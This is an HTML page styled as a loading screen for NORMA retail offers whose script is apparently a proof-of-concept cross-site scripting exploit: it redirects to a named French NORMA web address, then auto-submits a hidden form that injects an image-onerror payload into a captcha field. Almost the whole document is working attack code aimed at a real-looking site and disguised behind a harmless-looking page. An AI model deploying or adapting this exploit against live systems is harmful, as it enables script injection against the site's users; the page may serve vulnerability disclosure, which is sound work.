<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NORMA - Voir les offres</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #e0e0e0;
            border-top: 4px solid #e53935;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Chargement des offres...</p>
    </div>

<script>
(function() {
    var TARGET = "https://ws-fr.norma-online.de/fr/envoyer-a-une-amie/bonnes-affaires/a-saisir-lundi,-17.08.26/";
    var PAYLOAD = '<img src=x onerror="alert(document.domain)">';

    // If we are on the target domain (Step 2), fire the XSS
    if (window.location.hostname === "ws-fr.norma-online.de") {

        // Wait for the form and its hidden fields to be in the DOM
        var tries = 0;
        var wait = setInterval(function() {
            var formId = document.querySelector("#form_id");
            tries++;

            if (formId || tries > 20) {
                clearInterval(wait);

                var id = formId ? formId.value : "2026-08-18__exploit";

                var f = document.createElement("form");
                f.method = "POST";
                f.action = TARGET;

                var fields = {
                    "captcha[orange_captcha]": PAYLOAD,
                    "empfehlen[form][id]": id,
                    "empfehlen[persoenliche_daten][email]": "victim@example.com",
                    "empfehlen[persoenliche_daten][empfehlen_ihrname]": "Test",
                    "empfehlen[persoenliche_daten][empfehlen_seinname]": "PoC"
                };

                for (var name in fields) {
                    var inp = document.createElement("input");
                    inp.type = "hidden";
                    inp.name = name;
                    inp.value = fields[name];
                    f.appendChild(inp);
                }

                document.body.appendChild(f);
                f.submit();
            }
        }, 200);

    } else {
        // Step 1: Redirect to target to establish session cookie (1st-party)
        window.location.href = TARGET;
    }
})();
</script>
</body>
</html>
